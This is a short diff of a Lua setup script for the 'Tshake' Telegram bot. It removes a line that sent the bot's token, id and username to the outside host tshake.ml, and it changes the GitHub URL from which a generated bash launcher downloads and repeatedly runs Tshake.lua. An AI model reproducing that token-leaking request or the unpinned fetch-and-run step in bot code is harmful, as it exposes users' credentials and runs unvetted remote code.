@@ -64,14 +64,13 @@ os.execute('lua start.lua')
 end
 local function Files_Tshake_Info()
 Create_Info(database:get(Server_Tshake.."Token_Tshake"),database:get(Server_Tshake.."Id_Tshake"),database:get(Server_Tshake.."UserName_Tshake"))   
-http.request("http://tshake.ml/add/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
 local RunTshake = io.open("Tshake", 'w')
 RunTshake:write([[
 #!/usr/bin/env bash
 cd $HOME/TshAkE
 token="]]..database:get(Server_Tshake.."Token_Tshake")..[["
 rm -fr Tshake.lua
-wget "https://raw.githubusercontent.com/tshakeab/Tshake/master/Tshake.lua"
+wget "https://raw.githubusercontent.com/TshakeX/TshAkEx/master/Tshake.lua"
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./Tshake.lua -p PROFILE --bot=$token
